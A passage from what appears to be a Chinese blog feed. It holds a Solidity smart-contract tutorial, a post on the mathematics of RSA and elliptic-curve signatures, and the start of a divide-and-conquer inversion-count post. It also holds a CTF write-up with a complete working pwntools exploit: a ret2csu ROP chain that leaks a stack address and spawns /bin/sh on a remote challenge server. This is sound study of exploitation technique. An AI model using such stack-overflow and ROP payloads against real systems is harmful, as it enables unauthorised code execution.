<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function modifyBlogByUserAndId(</span><br><span class="line">       uint256 id,</span><br><span class="line">       string memory _title,</span><br><span class="line">       string memory _summary,</span><br><span class="line">       string memory _content</span><br><span class="line">   ) public &#123;</span><br><span class="line">       require(id &gt;&#x3D; 0 &amp;&amp; id &lt; blogList.length, &quot;Id invalid!&quot;);</span><br><span class="line">       require(msg.sender &#x3D;&#x3D; blogList[id].author, &quot;You can only modify your blog!&quot;);</span><br><span class="line">       uint256 idx &#x3D; id;</span><br><span class="line">       string memory old_title &#x3D; blogList[idx].title;</span><br><span class="line">       string memory old_summary &#x3D; blogList[idx].summary;</span><br><span class="line">       string memory old_content &#x3D; blogList[idx].content;</span><br><span class="line">       blogList[id] &#x3D; Blog(id, msg.sender, _title, _summary, _content, blogList[id].createTimestamp, block.timestamp);</span><br><span class="line">       emit ModifyBlogEvent(id, msg.sender, old_title, old_summary, old_content, _title, _summary, _content, block.timestamp);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>删除文章</strong></p>
<p>值得注意的是，在<code>Solidity</code>中，删除数组中的元素后，会将该元素所在的位置都置为初始值，并且长度不变，在这里你可以选择将最后的元素复制到该地址，然后使用<code>pop()</code>函数将最后一个元素删除，这里我并没有选择这样子，因为我想把文章ID和其在数组中的下边对应起来同时一篇文章应该有一个固定的<code>id</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function deleteBlogByUserAndId(uint256 id) public &#123;</span><br><span class="line">    require(id &gt;&#x3D; 0 &amp;&amp; id &lt; blogList.length, &quot;Id invalid!&quot;);</span><br><span class="line">    require(</span><br><span class="line">        msg.sender &#x3D;&#x3D; blogList[id].author,</span><br><span class="line">        &quot;You can only delete your blog!&quot;</span><br><span class="line">    );</span><br><span class="line">    uint256 idx &#x3D; id;</span><br><span class="line">    string memory old_title &#x3D; blogList[idx].title;</span><br><span class="line">    string memory old_summary &#x3D; blogList[idx].summary;</span><br><span class="line">    string memory old_content &#x3D; blogList[idx].content;</span><br><span class="line">    delete blogList[idx];</span><br><span class="line">    emit DeleteBlogEvent( id, msg.sender, old_title, old_summary, old_content, block.timestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>获取文章列表</strong></p>
<p>我们虽然在前面将<code>blogList</code>设置成了<code>public</code>，但是实际上<code>Solidity</code>编译时候会生成一个对应的<code>get</code>方法，该方法的接收一个参数作为下标，因此我们无法通过访问该变量直接获取所有的文章，我们需要暴露一个函数，使其返回所有的文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getAll() public view returns(Blog[] memory)&#123;</span><br><span class="line">       return blogList;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>view</code>关键字说明该方法会访问状态变量（<code>blogList</code>）,但是不会修改它，明确这一点很重要，它可以为调用者节省<code>gas</code>。</p>
<p>部署和连接咱们的智能合约将在之后进行。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【1】ChainBlog（本项目完整源码）.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>【2】web3.js中文文档.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>【3】Solidity中文文档.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>【4】truffle文档.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>【5】开发、部署第一个DApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>【6】DApp教程：用Truffle 开发一个链上记事本.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>【7】Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>数字签名背后原理</title>
    <url>/2022/10/26/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E8%83%8C%E5%90%8E%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>最近在学习区块链的知识，觉得其中的数字签名挺有意思的，想了解一下背后的大致数学原理。当然了，数字签名有很多种，一般采用非对称密钥密码体制来实现，常见的非对称加密算法有<code>RSA</code>和椭圆曲线加密算法，下面记录一下基于这两种算法的数字签名大致原理,注意，本文并不是在强调如何调用高级<code>API</code>，而是打算从数学原理出发。</p>
<a id="more"></a>

<h2 id="RSA数字签名"><a href="#RSA数字签名" class="headerlink" title="RSA数字签名"></a>RSA数字签名</h2><p>该算法的数字签名原理比较简单，在此之前，我希望你了解一下什么是<code>RSA</code>算法，可以在之前的<a href="https://www.yalexin.top/blog/blog/110" target="_blank" rel="noopener">【文章】</a>中找到该算法的介绍。</p>
<p>假设阿珍和阿强在通信，双方持有自己的私钥和对方的公钥。</p>
<p>在之前的<a href="https://www.yalexin.top/blog/blog/110" target="_blank" rel="noopener">【文章】</a>中，我们证明了<br>$$<br>m^{e*d}\equiv m\pmod{n} \tag{1}<br>$$<br>其中<code>&lt;e,n&gt;</code>作为公钥，<code>&lt;d,n&gt;</code>作为对应的私钥。</p>
<p>同时假设<code>&lt;e,n&gt;</code>是阿强的私钥，<code>&lt;d,n&gt;</code>是其公钥，公钥在阿珍手上有相应的一份副本。</p>
<p>先来整理一下流程：阿强准备发送的消息是”我是阿强，我喜欢你！”，然后在后面附上了他的签名，接着将消息和签名进行简单整合:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    message: "xxx",</span><br><span class="line">    signature: "yyy"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用阿珍的公钥进行加密，然后传输到阿珍，阿珍收到了，利用她的私钥解密，是可以还原到原消息和一个签名。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    message: "xxx",</span><br><span class="line">    signature: "yyy"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传输过程加密解密我们不关心，因为在之前介绍<code>RSA</code>的时候介绍过了，这里说一下签名的原理。</p>
<p>假设<code>m</code>是“我是阿强，我喜欢你！”的哈希值，阿强利用私钥对其求下面的式子：<br>$$<br>c=m^d\pmod{n}<br>$$<br>阿珍解密传输信息后，一定可以解析到<code>signature: &quot;yyy&quot;</code>的，即可以获得到$c$。</p>
<p>阿珍要验证这句话是不是阿强说的，万一是隔壁老王说的呢，是吧？毕竟隔壁老王那里也有她的<strong>公钥</strong>呢。</p>
<p>验证过程很简单，她手上有阿强的公钥，她做一下运算：<br>$$<br>m1=c^e\pmod{n}=m^{d<em>e}\pmod{n}\tag{2}<br>$$<br>根据式子（1）,我们很容易可以得到：<br>$$<br>m1=m\pmod{n}<br>$$<br>因此她直接将之前得到的消息计算哈希值，跟数字签名部分进行对比，二者一致，*</em>则说明该消息的确是由阿强发出的**，因为计算签名值的过程需要用到阿强的私钥，而该私钥只有他自己本人有，==这就达到了防伪造的目的==。</p>
<p>实际上，如果我们把流程再次简化，即阿强向大家（其他人有阿强的公钥）宣布“我是阿强，我喜欢阿珍！”，其他人收到消息后，只要利用阿强的公钥计算，即可验证阿强一定有说过这句话，无法抵赖！</p>
<h2 id="椭圆曲线算法数字签名"><a href="#椭圆曲线算法数字签名" class="headerlink" title="椭圆曲线算法数字签名"></a>椭圆曲线算法数字签名</h2><p>在此之前，我们先来了解一下<a href="https://zhuanlan.zhihu.com/p/143122476" target="_blank" rel="noopener">【椭圆曲线加密原理】</a>，其也是利用了“根据公钥，难以反推私钥”来达到安全目的，相比于<code>RSA</code>，可以使用更短的密钥实现同等的安全强度，区块链中用的数字签名算法就是椭圆曲线加密算法。</p>
<p> 假设还是刚刚的阿强和阿珍的场景，阿强的私钥为$k_a$，公钥为$p_a=k_a\cdot G$.</p>
<h3 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h3><p>该过程由阿强完成，流程如下：</p>
<ol>
<li>先随机产生一对公私钥，即$K$和$P=K\cdot G$</li>
<li>然后将随机产生的公钥的X坐标拿出来，即$r=x_P \pmod {n}$。</li>
<li>计算$S=(K^{-1}(hash(m)+k_a \cdot r)) \pmod{n}$，其中$K^{-1}\cdot K=1\pmod{n}$的逆元。</li>
<li>$r$和$S$作为签名结果。</li>
</ol>
<h3 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h3><p>该过程由阿珍完成，流程如下：</p>
<ol>
<li>计算$\alpha=(S^{-1}\cdot hash(m))\pmod{n}$</li>
<li>计算$\beta=(S^{-1}\cdot r)\pmod{n}$</li>
<li>计算$Y=(\alpha \cdot G+\beta \cdot p_a)\pmod{n}$</li>
<li>如果点$Y$的X坐标和$r$相同，则验证通过</li>
</ol>
<p>下面我们来证明第四点：</p>
<p>对于签名过程的第3点的式子，我们两边同乘$S^{-1}\cdot K$，得到<br>$$<br>K=(S^{-1}\cdot(hash(m)+k_a\cdot r))\pmod{n}\tag{3}<br>$$<br>继续将验证过程的第一点第二点代入到第三点中，有：<br>$$<br>Y=(S^{-1}(hash(m)\cdot G+r\cdot p_a))\pmod{n}<br>$$<br>同时注意到，$p_a=k_a\cdot G$，代入到上市，有<br>$$<br>Y=(S^{-1}(hash(m)+r\cdot k_a)\cdot G)\pmod{n} \tag{4}<br>$$<br>结合式子（3）和式子（4），我们有<br>$$<br>Y=K\cdot G \pmod{n}=P\pmod{n}<br>$$<br>进而证明了第四点。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>数字签名</tag>
      </tags>
  </entry>
  <entry>
    <title>初识ret2csu</title>
    <url>/2022/10/16/pwn%E8%8E%B7%E5%8F%96shell%E6%96%B9%E5%BC%8F%E4%B9%8B%E4%B8%80%E2%80%94%E2%80%94syscall/</url>
    <content><![CDATA[<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 <code>gadgets</code>，换句话说，我们不能够通过<code>pop</code>的方式直接修改所需要的寄存器， 这时候，我们可以利用 <code>x64</code> 下的<code>__libc_csu_init</code>中的 <code>gadgets</code>。这个函数是用来对<code>libc</code> 进行初始化操作的，在这里边，会对很多寄存器初始化，而一般的程序都会调用 <code>libc</code> 函数，所以这个函数一定会存在。</p>
<p>我们以一道题目为例：<a href="https://buuoj.cn/challenges#ciscn_2019_s_3" target="_blank" rel="noopener">【ciscn_2019_s_3】</a></p>
<a id="more"></a>

<h2 id="获取题目基础信息"><a href="#获取题目基础信息" class="headerlink" title="获取题目基础信息"></a>获取题目基础信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ciscn_s_3</span></span><br><span class="line">ciscn_s_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af580816080db5e4d1d93a271087adaee29028e8, not stripped</span><br></pre></td></tr></table></figure>

<p>64位小端程序，很常规</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols      FORTIFY  Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No     0</span><br></pre></td></tr></table></figure>

<p>没有<code>canary</code>，说明如果有栈溢出漏洞，则我们可以利用，另外<code>NX</code>也开启了，说明栈上不可执行。常规得不能再常规了。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>使用IDA分析，重要函数<code>vuln</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 30h        ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_write</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>实际上就是通过系统调用的方式调用了<code>read()</code>和<code>write()</code>函数，具体为最多写进<code>0x400h</code>个数据，然后再输出从<code>buf</code>开始的位置的<code>0x30h</code>个数据。</p>
<p>而我们的<code>buf</code>长度为<code>0x10</code>，也就是说我们可以利用栈溢出漏洞干点事情。</p>
<p>在此之前，我们先看看系统调用的一些知识。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>32位和64位系统调用有一些区别，具体为：</p>
<p>32位与64位 系统调用的区别：</p>
<ol>
<li><p>传参方式不同</p>
</li>
<li><p>系统调用号不同</p>
</li>
<li><p>调用方式 不同</p>
</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th>32位</th>
<th>64位</th>
</tr>
</thead>
<tbody><tr>
<td>传参方式</td>
<td>先将系统调用号传入 eax，然后将参数从左到右依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</td>
<td>首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</td>
</tr>
<tr>
<td>常见系统调用号</td>
<td>sys_read 的调用号 为 3<br>sys_write 的调用号 为 4</td>
<td>sys_read 的调用号 为 0<br>sys_write 的调用号 为 1<br>stub_execve 的调用号 为 59<br>stub_rt_sigreturn 的调用号 为 15</td>
</tr>
<tr>
<td>调用方式</td>
<td>使用 int 80h 中断进行系统调用</td>
<td>使用 syscall 指令进行系统调用</td>
</tr>
</tbody></table>
<blockquote>
<p>其他系统调用号可以参照文件<code>/usr/include/asm/unistd.h</code></p>
</blockquote>
<h2 id="溢出漏洞利用"><a href="#溢出漏洞利用" class="headerlink" title="溢出漏洞利用"></a>溢出漏洞利用</h2><p>确定其能够溢出以后，我们可以尝试利用溢出，控制程序的走向，即构造<code>execv(&#39;/bin/sh&#39;,0,0)</code>，再通过<code>syscall</code>执行<code>execv</code>，从而获取<code>shell</code>，栈大致布局如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rax&#x3D;59</span><br><span class="line">rdi&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">rsi&#x3D;0</span><br><span class="line">rdx&#x3D;0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>但是我们并没有上述连续的片段可以利用，只能借助几个片段来进行。</p>
<p>同时我们还要获取<code>&#39;/bin/sh&#39;</code>的地址，可是我们在<code>IDA</code>中，并没有发现此字符串，也就是说要我们手动构造，构造倒也不是难事，主要是如何找到该字符串地址？</p>
<p>我们在此回顾之前的<code>vuln</code>函数，我们会发现，该函数中会出输出从<code>buf</code>开始的<code>0x30h</code>的数据，而刚刚进入该函数的时候，栈内的大致布局如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 低地址</span><br><span class="line">buf </span><br><span class="line">...</span><br><span class="line">buf</span><br><span class="line">main_rbp</span><br><span class="line">main_retn_addr</span><br><span class="line">main&#39;s father function rbp</span><br><span class="line">main&#39;s father function retn_addr</span><br><span class="line">....</span><br><span class="line"># 高地址</span><br></pre></td></tr></table></figure>

<p>虽然栈地址每次都会改变，但是进入函数后，<code>buf</code>的地址和<code>main_retn_addr</code>之间的偏移是不变的，因此我们可以借助<code>write</code>函数泄露的地址来确定<code>buf</code>的地址，进一步地，如果我们在<code>buf</code>中写入<code>&#39;/bin/sh&#39;</code>,那该字符串的地址我们也就得到了。</p>
<p>获取到地址后，我们要继续回到<code>vuln</code>函数中，继续利用栈溢出漏洞，即构造<code>execv</code>的执行。</p>
<p>值得注意的是，在<code>vuln</code>函数中，并没有恢复栈平衡，在<code>buf</code>下面直接是返回地址，因为程序中，==在<code>retn</code>指令之前并没有<code>leave</code>指令==.</p>
<p>下一步，我们再动态调试，看一下之前说的偏移是多少，我们先运行到第一个系统调用之前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line">   0x4004ee &lt;vuln+1&gt;     mov    rbp, rsp</span><br><span class="line">   0x4004f1 &lt;vuln+4&gt;     xor    rax, rax</span><br><span class="line">   0x4004f4 &lt;vuln+7&gt;     mov    edx, 0x400</span><br><span class="line">   0x4004f9 &lt;vuln+12&gt;    lea    rsi, [rsp - 0x10]</span><br><span class="line">   0x4004fe &lt;vuln+17&gt;    mov    rdi, rax</span><br><span class="line"> ► 0x400501 &lt;vuln+20&gt;    syscall  &lt;SYS_read&gt;</span><br><span class="line">        fd: 0x0 (&#x2F;dev&#x2F;pts&#x2F;0)</span><br><span class="line">        buf: 0x7fffffffde60 ◂— 0x0</span><br><span class="line">        nbytes: 0x400</span><br><span class="line">   0x400503 &lt;vuln+22&gt;    mov    rax, 1</span><br><span class="line">   0x40050a &lt;vuln+29&gt;    mov    edx, 0x30</span><br><span class="line">   0x40050f &lt;vuln+34&gt;    lea    rsi, [rsp - 0x10]</span><br><span class="line">   0x400514 &lt;vuln+39&gt;    mov    rdi, rax</span><br><span class="line">   0x400517 &lt;vuln+42&gt;    syscall </span><br><span class="line">──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────</span><br><span class="line">00:0000│ rbp rsp 0x7fffffffde70 —▸ 0x7fffffffde90 ◂— 0x1</span><br><span class="line">01:0008│         0x7fffffffde78 —▸ 0x400536 (main+25) ◂— nop    </span><br><span class="line">02:0010│         0x7fffffffde80 —▸ 0x7fffffffdfa8 —▸ 0x7fffffffe2f8 ◂— &#39;&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;my_share&#x2F;chanllenge&#x2F;ciscn_2019_s_3&#x2F;ciscn_s_3&#39;</span><br><span class="line">03:0018│         0x7fffffffde88 ◂— 0x100000000</span><br></pre></td></tr></table></figure>

<p>我们可以看到当前栈底指针为<code>rbp=0x7fffffffde70</code>，我们发现在主函数中，调用vuln的下一行代码的地址是<code>0x400536</code>，并不是以<code>0x7f</code>开头的，不方便计算偏移，因此我们使用<code>0x7fffffffde80</code>指向的内存中的内容<code>0x7fffffffdfa8</code>计算偏移地址，然后继续运行，输入<code>aaaabbba</code>，然后查找该字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; search aaaabbba</span><br><span class="line">Searching for value: &#39;aaaabbba&#39;</span><br><span class="line">[stack]         0x7fffffffde60 &#39;aaaabbba\n&#39;</span><br></pre></td></tr></table></figure>

<p>有<code>0x7fffffffdfa8-0x7fffffffde60=0x148</code></p>
<p>因此获取的字符串地址的代码为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = flat([<span class="string">b'/bin/sh\0'</span> * <span class="number">2</span>, vuln_addr])</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line"></span><br><span class="line">hacker.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp = u64(hacker.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh_addr = rbp - <span class="number">0x148</span></span><br></pre></td></tr></table></figure>

<p>找到了字符串后，我们再来回顾一下要做的事情</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rax ← 59</span><br><span class="line">rdi ← &#x2F;bin&#x2F;sh</span><br><span class="line">rsi ← 0</span><br><span class="line">rdx ← 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>1-4行的顺序可变，只要保证执行<code>syscall</code>的时候，其对应的寄存器中的值是上述描述的即可。</p>
<p>通过下面的两个命令，我们可以得到控制上述的指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ciscn_s_3  --only <span class="string">'pop|ret'</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ciscn_s_3  --only <span class="string">'mov|ret'</span></span></span><br></pre></td></tr></table></figure>

<p>然后我们却无法找到直接修改<code>rdx</code>的地方。</p>
<p>然后，我们可以通过使用下面的命令查找修改该寄存器的地方：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump ciscn_s_3 --disassemble  -M intel | grep rdx</span></span><br><span class="line">400580: mov    rdx,r13</span><br></pre></td></tr></table></figure>

<p>继续使用命令观察<code>0x400580</code>后面的指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400580: mov    rdx,r13</span><br><span class="line">400583: mov    rsi,r14</span><br><span class="line">400586: mov    edi,r15d</span><br><span class="line">400589: call   QWORD PTR [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>可以看到还是能修改完，然后跳转的！只要在这里边将<code>r12</code>设置为返回的地址，<code>rbx</code>设置为0。</p>
<p>最终利用链如下图：</p>
<p><img src="https://cdn.yalexin.top/ROPgadget.png" alt="ROPgadget"></p>
<p>前两个<code>gadgets</code>就是利用了<code>ret2csu</code>的思想。</p>
<p>值得注意的是，call最终实际调用的地方是<code>[[r12+rbx*8]]</code>，假如说，我们的<code>mov rax, 0x3b</code>的地址是<code>7</code>,然后我们将该地址写入到栈上地址为<code>3</code>的地方，则我们的<code>r12+rbx*8</code>的值为<code>3</code>,即</p>
<p><img src="https://cdn.yalexin.top/call.drawio.png" alt="call.drawio"></p>
<p>第二次溢出利用代码为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b'/bin/sh\0'</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)</span><br><span class="line"><span class="comment"># bin_sh_addr + 0x50 是 mov_rax_ret_addr 所在地址</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh_addr + <span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(mov_rdx_rsi_edi_call_addr)</span><br><span class="line">payload += p64(mov_rax_ret_addr) + p64(pop_rdi_ret)+p64(bin_sh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">hacker = <span class="literal">None</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26674</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = flat([<span class="string">b'/bin/sh\0'</span> * <span class="number">2</span>, vuln_addr])</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line"></span><br><span class="line">hacker.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp = u64(hacker.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh_addr = rbp - <span class="number">0x118</span></span><br><span class="line"><span class="comment"># bin_sh_addr = rbp - 0x148</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret_addr = <span class="number">0x40059A</span></span><br><span class="line">mov_rdx_rsi_edi_call_addr = <span class="number">0x400580</span></span><br><span class="line">mov_rax_ret_addr = <span class="number">0x4004e2</span></span><br><span class="line">pop_rsi_r15_ret_addr = <span class="number">0x4005a1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\0'</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)</span><br><span class="line"><span class="comment"># bin_sh_addr + 0x50 是 mov_rax_ret_addr 所在地址</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh_addr + <span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(mov_rdx_rsi_edi_call_addr)</span><br><span class="line">payload += p64(mov_rax_ret_addr) + p64(pop_rdi_ret)+p64(bin_sh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendline(payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>然而本题中，官方提供的程序和实际远程运行的不一致，使得之前说的偏移量并不是<code>0x148</code>.</strong></p>
]]></content>
  </entry>
  <entry>
    <title>基于分治法的特定数列逆序数求法</title>
    <url>/2022/09/29/%E5%9F%BA%E4%BA%8E%E5%88%86%E6%B2%BB%E6%B3%95%E7%9A%84%E7%89%B9%E5%AE%9A%E6%95%B0%E5%88%97%E9%80%86%E5%BA%8F%E6%95%B0%E6%B1%82%E6%B3%95/</url>
    <content><![CDATA[<p>忙里偷闲，记录一下使用<strong>分治法</strong>求逆序数的实现过程。</p>
<a id="more"></a>

<h2 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h2><p><strong>逆序：</strong>在一个排列中，如果一对数的前后位置与大小顺序相反，即前面的数大于后面的数，那么它们就称为一个逆序。例如<code>&lt;3,1&gt;</code>就是一个逆序。</p>
<p><strong>逆序数：</strong>给定数列中，逆序的数目。例如数列:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[1,3,4,2]</span><br></pre></td></tr></table></figure>

<p>逆序数是2.</p>
<h3 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h3><p>很容易就想到的一个方法就是从头开始扫描，然后对于每一个扫描到的数字<code>a</code>，考察后面的每一个数字<code>b</code>，观察其是否满足逆序的定义，例如对于上述数列，对于数字1，逆序数为0；对于数字3，逆序数为1（<code>&lt;3,2&gt;</code>），依此类推，最终数列总的逆序数为2.</p>
<p>很遗憾，该算法复杂度为$O(n^2)$,对于暴躁的张三来说，当其要计算长度为10000的数列的逆序数时候，他是无法接受长时间等待的，<del>因为他还要去和阿珍约会呢</del></p>
<h3 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h3><blockquote>
<p>分而治之，逐个击破</p>
</blockquote>
<p>分治法的思想是将原问题分解成若干个子问题，而所有的子问题进行简单处理后就可以得到原问题的解。求解子问题的过程亦可以继续分解成子子问题，而子问题分解到“原子问题”（原子问题好像也不太严谨，大概意思就是一个可以直接求解的问题）后可以立即得到解。</p>
<p>例如对于下面的数列：我们可以每次把子数列分成两半，分别求左半部分和右半部分的逆序数</p>
<p><img src="https://cdn.yalexin.top/image-20220929225648745.png" alt="image-20220929225648745"></p>
<p>那我们如何还原出原问题的解呢？即未分解问题时候的逆序数。仔细想想，我们已经计算出了左右两边逆序数<code>leftCnt</code>、<code>rightCnt</code>，那么我们再计算出在“ 一个数字取自左边，另一个数字取自右边”的情况下，逆序数<code>cnt</code>的大小，原问题不就是这三个数字之和吗？</p>
<p>关键是怎么求<code>cnt</code>?</p>
<p>老方法？依次从左边选一个数字<code>a</code>，再依次从右边选一个数字<code>b</code>，很抱歉，这样子下来要判断$\frac{n}{2}*\frac{n}{2}=\frac{n^2}{4}   $次，综合下来时间复杂度还是$O(n^2)$。</p>
<p>仔细想想，我们要判断的数字一个来自左边，一个来自右边，如果我们分别让左边和右边有序，然后分别从第一个开始遍历，根据遍历到的数字进行计算逆序数，根据有序的性质，遍历完后逆序数也求解出来了，整个过程中，排序花费$O(n\log n)$，遍历花费$O(n)$，即合并子问题花费$O(n\log n)$.</p>
<p>关于合并过程的仔细分析，如下(简单起见，<strong>数列中不包含相同元素</strong>)：</p>
<p>先将左右两部分排序，设置两个指针，分别从左右两部分进行遍历，设左边遍历得到的数字是<code>a[i]</code>，右边的是<code>b[j]</code>。</p>
<ol>
<li>右边的指针j不断往后移动（尚未到结尾，如果到结尾，则到步骤3），直到<code>b[j]</code>恰好是右半部分中第一个不小于<code>a[i]</code>的数字，即在右半部分中<code>b[j]</code>的左边都是小于<code>a[i]</code>的，此时，由<code>a[i]</code>作为第一个数字组成的跨越左右两部分的数对（或者说序偶）中，逆序数刚好就是右半部分中<code>b[j]</code>的左边的数字个数。说起来有点绕口，看看下面的图：</li>
</ol>
<p><img src="https://cdn.yalexin.top/image-20220930001126349.png" alt="image-20220930001126349"></p>
